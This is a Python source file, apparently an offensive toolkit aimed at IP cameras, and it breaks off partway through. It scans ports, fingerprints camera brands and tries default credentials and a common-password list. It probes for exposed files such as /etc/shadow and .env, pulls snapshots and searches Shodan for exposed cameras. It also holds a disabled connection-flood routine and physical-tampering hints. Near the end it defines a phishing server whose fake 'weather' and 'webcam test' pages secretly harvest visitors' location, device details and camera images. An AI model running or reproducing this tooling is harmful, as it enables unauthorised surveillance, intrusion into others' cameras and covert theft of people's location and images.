import requests
import socket
import sys
import threading
import warnings
import ipaddress
import base64
import time
import os
os.environ['PYTHONIOENCODING'] = 'utf-8'

# Android-safe settings
MAX_THREADS = 12          # Reduced from 40
TIMEOUT = 6

try:
    from onvif import ONVIFCamera
except ImportError:
    try:
        from onvif.client import ONVIFCamera
    except ImportError:
        ONVIFCamera = None
        print("[!] Warning: ONVIF library not found or incompatible.")

try:
    from zeep.exceptions import Fault
except ImportError:
    Fault = Exception
import uuid
import ssl
from datetime import datetime
from bs4 import BeautifulSoup
import shodan
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Symbols/Emojis from the screenshots
SCAN = "🔍"
OPEN = "✅"
INFO = "ℹ️"
ALRT = "⚠️"
CAM  = "📷"
STRM = "🎥"
DONE = "🏁"
ERR  = "❌"
PLD  = "📊"
KEY  = "🔑"
LOCK = "🔓"
GLOB = "🌐"
TV   = "📺"
FIRE = "🔥"
SHLD = "🛡️"
RADR = "📡"

# Comprehensive Port List (728+ tactical ports)
PORTS_LIST = (
    list(range(1, 201)) +             # Basic & Web (200)
    list(range(1024, 1101)) +         # Common Camera High Ports (77)
    list(range(5000, 5051)) +         # Synology/UPnP/Misc (51)
    list(range(8000, 8201)) +         # Hikvision/HTTP-Alt Large Range (201)
    list(range(8440, 8451)) +         # HTTPS Alts (11)
    list(range(8550, 8561)) +         # RTSP Alts (11)
    list(range(8880, 8891)) +         # Misc Alts (11)
    list(range(9000, 9151)) +         # Sony/Bosch/Generic Range (151)
    list(range(37770, 37786)) +       # Dahua Specific (16)
    [1935, 3702, 34567, 10554]        # Standard CCTV (4)
)
COMMON_PORTS = sorted(list(set(PORTS_LIST)))

PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP (Web Interface)",
    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 443: "HTTPS (Secure Web Interface)",
    554: "RTSP (Streaming)", 1883: "MQTT (Cloud Connectivity)", 1935: "RTMP", 3702: "ONVIF Discovery",
    34567: "XMEye Default", 37777: "Dahua Service", 5000: "UPnP / Synology",
    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt (Web Interface)", 8883: "MQTTS (Secure Cloud)",
    8443: "HTTPS-Alt / Cloud", 8554: "RTSP-Alt", 9000: "HTTP-Alt / Sony / Cloud"
}

# Expanded Fingerprint Database for many camera types
FINGERPRINT_PATHS = [
    "/System/configurationFile", "/ISAPI/System/deviceInfo",            # Hikvision
    "/cgi-bin/magicBox.cgi?action=getSystemInfo",                      # Dahua
    "/axis-cgi/admin/param.cgi?action=list",                           # Axis
    "/sony/info", "/media/video1",                                     # Sony
    "/nphControlCamera?Resolution=640x480",                            # Panasonic
    "/cgi-bin/admin/getparam.cgi",                                     # Vivotek
    "/control/faststream.jpg?stream=full",                             # Mobotix
    "/api.cgi?cmd=GetAbility", "/api.cgi?cmd=GetDevInfo",              # Reolink
    "/get_params.cgi", "/get_status.cgi",                              # Foscam
    "/deviceinfo", "/System/deviceInfo", "/conf", "/admin/device.php", # Generic
    "/onvif/device_service", "/onvif/Media", "/onvif/PTZ",             # ONVIF specific
    "/etc/config/image_config", "/etc/config/network_config",          # Potential backups
    "/proc/kmsg", "/var/log/messages", "/tmp/log",                     # Potential leaks
    "/shell?ls", "/cgi-bin/config.sh", "/cgi-bin/main.cgi",            # Debug/Shell
    "/system.ini?loginuse&loginpas",                                   # CamOver / GoAhead
    "/.env", "/.git/config", "/.svn/entries", "/.htaccess",            # Web Leaks
    "/phpinfo.php", "/info.php", "/status", "/config.xml",             # Server Info
    "/users.xml", "/accounts.xml", "/passwords.txt",                   # Cred leaks
    "/view/viewer_index.shtml", "/live/index.html",                    # Specific Index pages
    "/cgi-bin/get_camera_params.cgi", "/cgi-bin/get_status.cgi"         # More CCTV paths
]

# Expanded Port Service Map
PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP (Web Interface)",
    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 110: "POP3", 143: "IMAP", 443: "HTTPS (Secure)",
    554: "RTSP (Streaming)", 1883: "MQTT (Cloud)", 1935: "RTMP", 3306: "MySQL", 3389: "RDP",
    3702: "ONVIF Discovery", 5000: "UPnP / Synology", 5555: "ADB (Android Debug)",
    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt", 8081: "HTTP-Alt", 8443: "HTTPS-Alt",
    8883: "MQTTS", 8554: "RTSP-Alt", 9000: "Sony / Bosch", 34567: "XMEye Default",
    37777: "Dahua Service", 37778: "Dahua Config", 10554: "RTSP-Alt"
}

# Expanded Brand-specific prioritized credentials (100+)
BRAND_CREDENTIALS = {
    "Hikvision": [("admin", "12345"), ("admin", "abc12345"), ("admin", "admin12345"), ("admin", "12345678a"), ("admin", "hik12345"), ("admin", "Hik12345")],
    "Dahua": [("admin", "admin"), ("admin", "888888"), ("admin", "admin123"), ("666666", "666666"), ("admin", "password"), ("admin", "123456")],
    "Axis": [("root", "pass"), ("root", "root"), ("root", "axis"), ("admin", "admin"), ("root", "password")],
    "Sony": [("admin", "admin"), ("admin", ""), ("root", "root"), ("admin", "12345")],
    "Panasonic": [("admin", "12345"), ("admin", "password"), ("admin", "admin123")],
    "Foscam": [("admin", ""), ("admin", "admin"), ("admin", "123456")],
    "Reolink": [("admin", ""), ("admin", "admin")],
    "TP-Link": [("admin", "admin"), ("admin", "password"), ("admin", "12345")],
    "Wisenet": [("admin", "4321"), ("admin", "1234567")],
    "Vivotek": [("root", ""), ("root", "root"), ("admin", "admin")]
}

# Light Dictionary Mode (Top 50 common IoT/Camera passwords)
IOT_COMMON_PASSWORDS = [
    "admin", "12345", "123456", "password", "1234", "root", "admin123", "12345678",
    "guest", "user", "pass", "1111", "0000", "666666", "888888", "9999", "qwerty",
    "default", "support", "service", "camera", "operator", "supervisor", "system",
    "123456789", "123123", "admin1234", "admin888", "admin777", "admin666",
    "hik12345", "dahua123", "adminadmin", "rootroot", "meinsm", "ubnt", "microtik",
    "admin@123", "12345678a", "admin1", "12345a", "security", "master", "public",
    "private", "cisco", "login", "webcam", "video", "monitor"
]

DEFAULT_CREDENTIALS = [
    ("", ""), ("admin", ""), ("admin", "admin"), ("admin", "12345"),
    ("admin", "123456"), ("admin", "1234"), ("root", "root"), ("root", "toor"),
    ("admin", "password"), ("support", "support"), ("user", "user"), ("admin", "admin123"),
    ("admin", "12345678"), ("admin", "888888"), ("admin", "666666"), ("root", "password"),
    ("admin", "admin1234"), ("guest", "guest"), ("operator", "operator"), ("service", "service"),
    ("admin", "1111"), ("admin", "0000"), ("admin", "9999"), ("admin", "123123"),
    ("root", "pass"), ("admin", "pass"), ("admin", "admin888"), ("admin", "admin777"),
    ("admin", "smcadmin"), ("admin", "meinsm"), ("ubnt", "ubnt"), ("admin", "camera")
]

# Expanded CVE Database (Professional-Grade)
CVE_DATABASE = {
    "Axis": [
        ("CVE-2018-10660", "CRITICAL: Shell command injection in axis-cgi/param.cgi. Allows unauthenticated RCE."),
        ("CVE-2020-29550", "HIGH: Heap-based buffer overflow in the ONVIF service. Can lead to service crash or RCE."),
        ("CVE-2023-21406", "HIGH: Multiple vulnerabilities in AXIS OS allowing escalation of privileges."),
        ("CVE-2021-31986", "HIGH: Command injection in various AXIS products via firmware upgrade.")
    ],
    "Hikvision": [
        ("CVE-2017-7921", "CRITICAL: Unauthenticated bypass to view snapshots/configs. Allows full system access."),
        ("CVE-2021-36260", "CRITICAL: Command injection via web interface. Most prevalent Hikvision RCE."),
        ("CVE-2013-4977", "HIGH: RTSP overflow allowing remote code execution."),
        ("CVE-2023-28808", "MEDIUM: Improper authentication in some products allowing session hijacking."),
        ("CVE-2014-4880", "HIGH: Information disclosure via config file download."),
        ("CVE-2021-36260", "CRITICAL: Command injection vulnerability in the web server of some Hikvision IP cameras.")
    ],
    "Dahua": [
        ("CVE-2021-33044", "CRITICAL: Authentication Bypass during identity verification. Allows admin access without password."),
        ("CVE-2021-33045", "CRITICAL: Authentication Bypass during identity verification (Companion to 33044)."),
        ("CVE-2013-6117", "CRITICAL: Backdoor in older firmware. Cleartext credentials leaked on port 37777."),
        ("CVE-2022-30563", "HIGH: ONVIF implementation authentication bypass. Replay attack possible."),
        ("CVE-2017-3193", "HIGH: Buffer overflow in web management interface."),
        ("CVE-2020-25167", "MEDIUM: Weak password hashing allowing easy brute force.")
    ],
    "Sony": [
        ("CVE-2018-13271", "CRITICAL: Remote Code Execution in some IP cameras via CGI binary."),
        ("CVE-2019-15886", "HIGH: Authentication bypass allowing unauthorized settings modification."),
        ("CVE-2016-10368", "MEDIUM: Cross-site scripting (XSS) in management console.")
    ],
    "Bosch": [
        ("CVE-2021-23847", "HIGH: Memory corruption in web server leading to DoS or RCE."),
        ("CVE-2021-23848", "MEDIUM: Information disclosure through debug logs.")
    ],
    "Reolink": [
        ("CVE-2020-25169", "HIGH: Cleartext storage of sensitive information in memory."),
        ("CVE-2022-26301", "HIGH: Command injection via unauthenticated API call."),
        ("CVE-2023-46132", "CRITICAL: Multiple unauthenticated vulnerabilities in Reolink App/Client.")
    ],
    "Foscam": [
        ("CVE-2017-17020", "CRITICAL: Hardcoded root password in various models."),
        ("CVE-2018-19077", "HIGH: Command injection in web management interface.")
    ]
}

# Snapshot paths for common brands
SNAPSHOT_PATHS = [
    "/onvif-http/snapshot?Profile_1", "/ISAPI/Streaming/channels/1/picture", # Hikvision
    "/cgi-bin/snapshot.cgi", "/cgi-bin/magicBox.cgi?action=getSnapshot",     # Dahua
    "/axis-cgi/jpg/image.cgi", "/axis-cgi/mjpg/video.cgi",                   # Axis
    "/snapshot.jpg", "/snap.jpg", "/image.jpg", "/tmpfs/auto.jpg",          # Generic
    "/cgi-bin/viewer/video.jpg", "/cgi-bin/net_image.cgi",                  # Vivotek/Panasonic
    "/api/camera/snapshot", "/api/video/snapshot"                           # Modern/API
]

# Common HTTP camera paths for stream detection
HTTP_CAMERA_PATHS = [
    "/video", "/stream", "/live", "/mjpeg/video.mjpg", "/snapshot.jpg",
    "/cgi-bin/mjpg/video.cgi", "/axis-cgi/mjpg/video.cgi", "/video.cgi",
    "/videostream.cgi", "/mjpg.cgi", "/stream.cgi", "/live.cgi",
    "/cgi-bin/viewer/video.jpg", "/img/snapshot.cgi", "/cgi-bin/snapshot.cgi",
    "/video/mjpg.cgi", "/api/video", "/api/stream/live", "/api/video/live",
    "/api/live", "/api/stream", "/api/camera/video", "/mjpeg", "/videoMain",
    "/nphControlCamera", "/axis-media/media.amp"
]

TIMEOUT = 5
MAX_THREADS = 40

def probe_rtsp(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.8)
            if s.connect_ex((ip, port)) == 0:
                s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
                response = s.recv(1024).decode(errors="ignore")
                if "RTSP/1.0" in response:
                    server = ""
                    for line in response.splitlines():
                        if line.lower().startswith("server:"):
                            server = line.split(":", 1)[1].strip()
                    return True, server
    except: pass
    return False, ""

def test_dos_resilience(ip, port):
    """Performs a light connection flood to test DoS resilience (Lab Only)."""
    print(f"       {ALRT} DoS Resilience test disabled on Android for stability.")
    return
    print(f"\n  [{FIRE}] Testing DoS Resilience (Connection Flooding) on Port {port}:")
    print(f"       {ALRT} NOTE: This test is intended for controlled lab environments only.")

    connections = []
    start_time = time.time()
    try:
        # Attempt to open 50 simultaneous connections
        for _ in range(50):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            if s.connect_ex((ip, port)) == 0:
                connections.append(s)

        end_time = time.time()
        flood_duration = end_time - start_time
        print(f"       {INFO} Opened {len(connections)} concurrent connections in {flood_duration:.2f}s")

        # Check if the service is still responsive
        check_start = time.time()
        try:
            r = requests.get(f"http://{ip}:{port}", timeout=2, verify=False)
            latency = time.time() - check_start
            print(f"       {OPEN} Service remains responsive (Latency: {latency:.2f}s)")
            if latency > 1.0:
                print(f"       {ALRT} WARNING: High latency under load detected.")
        except:
            print(f"       {FIRE} CRITICAL: Service HUNG or REJECTED connections under light load!")

    except Exception as e:
        print(f"       {ERR} Resilience test failed: {str(e)}")
    finally:
        for s in connections:
            try: s.close()
            except: pass

def get_physical_security_hints(brand):
    """
    Advanced Physical Security Assessment logic.
    Provides detailed intelligence on hardware-level vulnerabilities.
    """
    base_hints = [
        "Inspect for external RESET buttons on pigtail cables or under flaps.",
        "Check for unshielded SD Card slots that allow physical data extraction.",
        "Look for visible UART/Serial headers (often 4 pins) on the internal PCB.",
        "Scan for exposed USB ports used for local maintenance or firmware loading."
    ]

    brand_hints = {
        "Hikvision": [
            "Check the bottom panel for a small door; often hides the SD slot and a RESET button.",
            "HOLD RESET while powering on (30s) to force factory defaults on most models.",
            "UART Pins: VCC, RX, TX, GND (often 3.3v TTL) located near the SoC.",
            "Exposed Ethernet pigtail: Check for PoE grounding issues or physical tapping."
        ],
        "Dahua": [
            "External RESET button is frequently found on the camera pigtail or near the lens.",
            "Holding RESET during boot (10-15s) often clears the admin password.",
            "UART: Standard 4-pin header (GND, TX, RX, 3.3V) usually clearly silk-screened.",
            "Some NVRs/Cameras have a front-facing USB port that may accept auto-run firmware."
        ],
        "Axis": [
            "Check for the 'Control Button' near the SD card slot. Used for factory reset and service modes.",
            "Firmware can often be re-uploaded via the USB port on high-end dome models.",
            "Internal microSD cards may contain unencrypted video caches if not hardened."
        ],
        "Reolink": [
            "RESET button is almost always exposed on the cable harness. Extremely vulnerable.",
            "SD card slot is protected by a rubber grommet; ensure it hasn't been tampered with.",
            "Proprietary power connectors may leak data if serial-over-power is enabled."
        ],
        "Generic": [
            "Exposed pigtail cables allow for easy network tapping or hardware reset.",
            "Standard UART/Serial headers are universal for low-cost Chinese chipsets (XM, GrainMedia).",
            "Hardware Backdoors: Look for unpopulated 'J1' or 'J2' headers on the mainboard."
        ]
    }

    specific = brand_hints.get(brand, brand_hints["Generic"])
    full_assessment = "\n       ".join(base_hints + specific)
    return full_assessment

def analyze_tls(ip, port):
    """Analyzes the TLS/SSL configuration of a given port."""
    print(f"    [{SHLD}] TLS/SSL Analysis for Port {port}:")
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cipher = ssock.cipher()
                version = ssock.version()
                cert = ssock.getpeercert(binary_form=True)

                print(f"       {INFO} Protocol: {version}")
                print(f"       {INFO} Cipher: {cipher[0]} ({cipher[2]} bits)")

                if version in ["TLSv1", "TLSv1.1"]:
                    print(f"       {ALRT} VULNERABILITY: Deprecated TLS version ({version})")

                if cert:
                    x509 = ssl.DER_cert_to_PEM_cert(cert)
                    # Simple expiry check would require more deps, but we can flag self-signed/generic
                    if "OU=Root CA" in x509 or "CN=IPCamera" in x509:
                        print(f"       {ALRT} WARNING: Likely Self-Signed or Generic Certificate")
    except Exception as e:
        print(f"       {ERR} TLS Analysis Failed: {str(e)}")

def directory_enumeration(ip, port, proto, brand, auth=None):
    """Targeted directory enumeration for sensitive paths."""
    print(f"    [{RADR}] Running Targeted Directory Enumeration...")
    sensitive_paths = [
        "/php/get_system_info.php", "/system/device_info", "/proc/kmsg",
        "/config/backup.bin", "/mnt/sdcard/", "/etc/shadow", "/etc/passwd",
        "/cgi-bin/config.sh", "/cgi-bin/main.cgi?action=get_sys_info",
        "/axis-cgi/admin/param.cgi?action=list", "/ISAPI/Security/users",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo"
    ]

    found = []
    for path in sensitive_paths:
        try:
            url = f"{proto}://{ip}:{port}{path}"
            r = requests.get(url, auth=auth, timeout=2, verify=False)
            if r.status_code == 200:
                print(f"       {FIRE} EXPOSED: {url} (HTTP 200)")
                found.append(path)
            elif r.status_code == 401:
                pass # Protected, good
        except: pass
    return found

def analyze_http_port(ip, port):
    print(f"\n  {SCAN} Analyzing Port {port} ({'HTTPS' if port in [443, 8443] else 'HTTP'}):")
    try:
        proto = "https" if port in [443, 8443] else "http"
        url = f"{proto}://{ip}:{port}"
        r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)

        content_type = r.headers.get('Content-Type', 'unknown')
        server = r.headers.get('Server', 'unknown')
        status = r.status_code

        print(f"    {OPEN} Content Type: {content_type}")
        if status == 200:
            print(f"    {OPEN} Endpoint Active: {url}/ (HTTP {status})")
        print(f"    {INFO} Server: {server}")
        print(f"    {INFO} Status: {status}")

        # Extended Brand Detection in Body/Headers
        c = r.text.lower()
        s = server.lower()
        brand = "Generic"
        if "hikvision" in c or "hikvision" in s or "dvrip" in c: brand = "Hikvision"
        elif "dahua" in c or "web service" in c or "dahua" in s: brand = "Dahua"
        elif "axis" in c or "axis" in s: brand = "Axis"
        elif "sony" in c or "sony" in s: brand = "Sony"
        elif "bosch" in c or "bosch" in s: brand = "Bosch"
        elif "samsung" in c or "samsung" in s or "hanwha" in c: brand = "Samsung/Hanwha"
        elif "panasonic" in c: brand = "Panasonic"
        elif "vivotek" in c: brand = "Vivotek"
        elif "reolink" in c: brand = "Reolink"
        elif "foscam" in c: brand = "Foscam"
        elif "mobotix" in c: brand = "Mobotix"
        elif "cp plus" in c or "cpplus" in c: brand = "CP Plus"
        elif "camit" in c or "dvr" in c: brand = "Generic DVR"

        if brand != "Generic":
            print(f"    {SHLD} Brand Identified: {brand}")

        if any(x in c for x in ["login", "user", "password", "auth"]):
            print(f"    {OPEN} Login Form Detected")

        return c, brand
    except Exception as e:
        print(f"    {ERR} Connection Error: {type(e).__name__}")
        return "", "Generic"

import re

def parse_firmware_data(text, brand):
    """Attempts to extract firmware and model info using regex."""
    info = {"model": "Unknown", "firmware": "Unknown", "build": "Unknown"}

    if brand == "Hikvision":
        m = re.search(r"<model>(.*?)</model>", text, re.I)
        f = re.search(r"<firmwareVersion>(.*?)</firmwareVersion>", text, re.I)
        b = re.search(r"<firmwareReleasedDate>(.*?)</firmwareReleasedDate>", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)
        if b: info["build"] = b.group(1)
    elif brand == "Dahua":
        m = re.search(r"DeviceType=(.*?)\r\n", text, re.I)
        f = re.search(r"SoftwareVersion=(.*?)\r\n", text, re.I)
        b = re.search(r"BuildDate=(.*?)\r\n", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)
        if b: info["build"] = b.group(1)
    elif brand == "Axis":
        m = re.search(r"root.Brand.ProdFullName=(.*?)\n", text, re.I)
        f = re.search(r"root.Properties.System.Firmware.Version=(.*?)\n", text, re.I)
        if m: info["model"] = m.group(1)
        if f: info["firmware"] = f.group(1)

    # Generic extraction for common patterns
    if info["model"] == "Unknown":
        m = re.search(r"(?:model|device)[_ ]?(?:name|type)[\":= ]+([^\"<\n\r,]+)", text, re.I)
        if m: info["model"] = m.group(1).strip()
    if info["firmware"] == "Unknown":
        f = re.search(r"(?:fw|firmware|version|soft)[_ ]?(?:ver|version)[\":= ]+([^\"<\n\r,]+)", text, re.I)
        if f: info["firmware"] = f.group(1).strip()

    return info

def manual_snapshot_capture(target_ip, port, user=None, pwd=None):
    """Specific function for UI-triggered snapshot capture."""
    proto = "https" if port in [443, 8443] else "http"
    auth = (user, pwd) if user else None

    paths = [
        "/snapshot.jpg",
        "/cgi-bin/snapshot.cgi",
        "/ISAPI/Streaming/channels/101/picture",
        "/cgi-bin/viewer/video.jpg",
        "/onvif-http/snapshot?Profile_1"
    ]

    for path in paths:
        try:
            url = f"{proto}://{target_ip}:{port}{path}"
            r = requests.get(url, auth=auth, timeout=5, verify=False)
            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                # Return base64 for the UI to display
                return base64.b64encode(r.content).decode('utf-8')
        except: pass
    return None

def quick_test_url(url, timeout=5):
    """Performs a quick HTTP GET test on a URL (curl-like)."""
    try:
        if url.startswith("rtsp"):
            print(f"    📡 RTSP streams can't be tested with HTTP - try in VLC or Live View")
            return
        # Use stream=True to avoid hanging on infinite MJPEG streams
        r = requests.get(url, timeout=timeout, verify=False, stream=True)

        # We only read headers and maybe a tiny bit of content to get size if it exists
        size_kb = 0
        if 'Content-Length' in r.headers:
            size_kb = int(r.headers['Content-Length']) // 1024
        else:
            # For streams, we don't want to call r.content as it will hang
            size_kb = 0

        print(f"    ✅ {url} → HTTP {r.status_code} | Size: {size_kb}KB (reported)")
        return r.status_code
    except Exception as e:
        print(f"    ❌ {url} → Error: {type(e).__name__}")

def shodan_search(api_key, query):
    """Searches Shodan for cameras based on a query."""
    print(f"\n[{GLOB}] Initiating Global Shodan Search: {query}")
    try:
        api = shodan.Shodan(api_key)
        results = api.search(query)
        print(f"  {OPEN} Total Results Found: {results['total']}")

        for result in results['matches'][:10]: # Top 10 for terminal
            ip = result['ip_str']
            port = result['port']
            org = result.get('org', 'Unknown Org')
            print(f"  {RADR} {ip}:{port} ({org})")
            if 'product' in result: print(f"     {INFO} Product: {result['product']}")
            if 'location' in result:
                loc = result['location']
                print(f"     {GLOB} Location: {loc.get('city', 'Unknown')}, {loc.get('country_name', 'Unknown')}")
    except Exception as e:
        print(f"  {ERR} Shodan Search Error: {str(e)}")

def discover_upnp_ssdp():
    """
    Broad SSDP M-SEARCH for discovering UPnP devices in the local network.
    """
    print(f"\n{RADR} Sending SSDP M-SEARCH (Multicast Discovery)...")
    ssdp_request = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 2\r\n'
        'ST: ssdp:all\r\n'
        '\r\n'
    )

    discovered_devices = {}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        sock.sendto(ssdp_request.encode(), ('239.255.255.250', 1900))

        while True:
            try:
                data, addr = sock.recvfrom(4096)
                resp = data.decode(errors='ignore')
                location = re.search(r"LOCATION: (.*)\r\n", resp, re.I)
                server = re.search(r"SERVER: (.*)\r\n", resp, re.I)
                usn = re.search(r"USN: (.*)\r\n", resp, re.I)

                if location:
                    loc_url = location.group(1).strip()
                    if addr[0] not in discovered_devices:
                        discovered_devices[addr[0]] = loc_url
                        print(f"  {OPEN} SSDP RESPONSE from {addr[0]}")

                        # Use BeautifulSoup to parse device description if possible
                        try:
                            desc_resp = requests.get(loc_url, timeout=2)
                            if desc_resp.status_code == 200:
                                soup = BeautifulSoup(desc_resp.content, 'xml')
                                dev_name = soup.find('friendlyName')
                                model_name = soup.find('modelName')
                                manuf = soup.find('manufacturer')

                                if dev_name: print(f"     {INFO} Friendly Name: {dev_name.text}")
                                if model_name: print(f"     {INFO} Model: {model_name.text}")
                                if manuf: print(f"     {INFO} Manufacturer: {manuf.text}")
                        except: pass

                        if server: print(f"     {INFO} Server Header: {server.group(1).strip()}")
                        if usn: print(f"     {INFO} USN: {usn.group(1).strip()[:60]}...")
            except socket.timeout:
                break
    except Exception as e:
        print(f"  {ERR} SSDP Discovery Error: {str(e)}")

    return discovered_devices

def get_mac_vendor(target_ip):
    """Attempts MAC lookup via ARP and identifies Vendor."""
    mac = "Unknown"
    vendor = "Unknown Vendor"
    try:
        if os.path.exists("/proc/net/arp"):
            # Try to read ARP table
            with open("/proc/net/arp", "r") as f:
                for line in f:
                    if target_ip in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            mac = parts[3]
                            break
    except:
        return "Unknown", "Unknown (Android restriction)"

    try:
        if mac != "Unknown" and mac != "00:00:00:00:00:00":
            # Simple offline vendor check for top camera brands
            prefix = mac.replace(":", "").upper()[:6]
            vendors = {
                "00408C": "Axis Communications", "00E04F": "Axis Communications", "ACCC8E": "Axis Communications",
                "001DFA": "Hikvision", "BCAD28": "Hikvision", "4419B6": "Hikvision", "CC6B1E": "Hikvision", "B4A382": "Hikvision",
                "000B5D": "Dahua Technology", "38AF29": "Dahua Technology", "6C1F6E": "Dahua Technology", "9002A9": "Dahua Technology",
                "00075F": "Panasonic", "0080F0": "Panasonic", "88108F": "Panasonic",
                "00032F": "Sony", "000ED9": "Sony", "28C13C": "Sony",
                "000747": "Bosch Security Systems", "000AF5": "Bosch Security Systems",
                "0002D1": "Vivotek", "0018AE": "Vivotek",
                "B0C554": "Reolink", "E0B94D": "Reolink",
                "00606E": "Foscam (Shenzhen Foscan)", "B4B362": "Foscam",
                "000325": "Mobotix",
                "000C29": "VMware (Virtual Target)", "080027": "VirtualBox (Virtual Target)"
            }
            vendor = vendors.get(prefix, "Searching online...")

            # Online fallback for more accuracy
            if vendor == "Searching online...":
                try:
                    r = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
                    if r.status_code == 200:
                        vendor = r.text
                except:
                    vendor = "Unknown (API Timeout)"

        return mac, vendor
    except:
        return "Unknown", "MAC Restricted"

def identify_device(ip):
    """Fallback identification when MAC is restricted (Android 10+)."""
    # Expanded ports for better identification
    cam_ports = {
        554: "RTSP (IP Camera)",
        3702: "ONVIF (IP Camera)",
        8000: "Hikvision",
        37777: "Dahua",
        34567: "XMEye / Generic CCTV",
        80: "HTTP",
        443: "HTTPS",
        8080: "HTTP-Alt",
        81: "HTTP-Alt",
        82: "HTTP-Alt",
        88: "HTTP-Alt",
        5000: "Synology / UPnP",
        8443: "HTTPS-Alt",
        9000: "Sony / Bosch",
        37778: "Dahua Config",
        21: "FTP (Storage)",
        23: "Telnet (Console)"
    }

    found_ports = []
    brand = "Unknown Device"
    is_camera = False

    # Fast port check
    for port, label in cam_ports.items():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1) # Very fast check for LAN
                if s.connect_ex((ip, port)) == 0:
                    found_ports.append(port)
                    if port in [554, 3702, 8000, 37777, 34567, 37778]:
                        is_camera = True
                        if port == 8000: brand = "Hikvision"
                        elif port in [37777, 37778]: brand = "Dahua"
                        elif port == 34567: brand = "XMEye Camera"
                        elif port == 554 and brand == "Unknown Device": brand = "IP Camera"
        except: pass

    # Try HTTP banner if web port is open for deeper identification
    web_ports = [p for p in found_ports if p in [80, 443, 8080, 81, 82, 88, 5000, 8443, 9000]]
    if web_ports:
        for p in web_ports:
            try:
                proto = "https" if p in [443, 8443] else "http"
                r = requests.get(f"{proto}://{ip}:{p}", timeout=0.5, verify=False, allow_redirects=True)
                server = r.headers.get("Server", "").lower()
                text = r.text.lower()

                # Check headers and body for common brands
                if any(x in server or x in text for x in ["hikvision", "hik-", "dvrip"]):
                    brand = "Hikvision"; is_camera = True; break
                elif any(x in server or x in text for x in ["dahua", "web service", "dvr-", "nvr-"]):
                    brand = "Dahua"; is_camera = True; break
                elif "axis" in server or "axis" in text:
                    brand = "Axis Camera"; is_camera = True; break
                elif "bosch" in server:
                    brand = "Bosch Camera"; is_camera = True; break
                elif "sony" in server:
                    brand = "Sony Camera"; is_camera = True; break
                elif "reolink" in text:
                    brand = "Reolink Camera"; is_camera = True; break
                elif "foscam" in text:
                    brand = "Foscam Camera"; is_camera = True; break
                elif "tplink" in text or "tapo" in text:
                    brand = "TP-Link/Tapo"; is_camera = True; break
                elif "wyze" in text:
                    brand = "Wyze Camera"; is_camera = True; break
                elif "hanwha" in text or "wisenet" in text:
                    brand = "Hanwha/Wisenet"; is_camera = True; break
            except: pass

    icon = CAM if is_camera else INFO
    display_name = f"{icon} {brand}"
    if found_ports:
        display_name += f" (Ports: {', '.join(map(str, sorted(found_ports[:3])))})"

    # If it's a router
    if brand == "Unknown Device" and (ip.endswith(".1") or ip.endswith(".254")):
        display_name = f"🏠 Gateway / Router"

    return display_name

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json

app_flask = Flask(__name__)
CORS(app_flask)

# Global storage for Storm results
storm_results = []

STORM_TEMPLATES = {
    "NearYou": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Weather Near You</title>
        <script>
            function gather() {
                const info = {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    resolution: `${window.screen.width}x${window.screen.height}`
                };

                navigator.geolocation.getCurrentPosition(pos => {
                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                    info.acc = pos.coords.accuracy;
                    send(info);
                }, err => {
                    info.error = "Location Denied";
                    send(info);
                });
            }

            function send(data) {
                fetch('/post', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).then(() => {
                    window.location.href = "{{ redirect_url }}";
                });
            }
            window.onload = gather;
        </script>
    </head>
    <body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
        <div style="text-align: center;">
            <h1>Checking Weather...</h1>
            <p>Please allow location to find your local station.</p>
        </div>
    </body>
    </html>
    """,
    "Webcam": """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Webcam Test</title>
        <script>
            async function start() {
                const info = { ua: navigator.userAgent };
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    info.image = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    info.error = "Webcam Denied";
                }

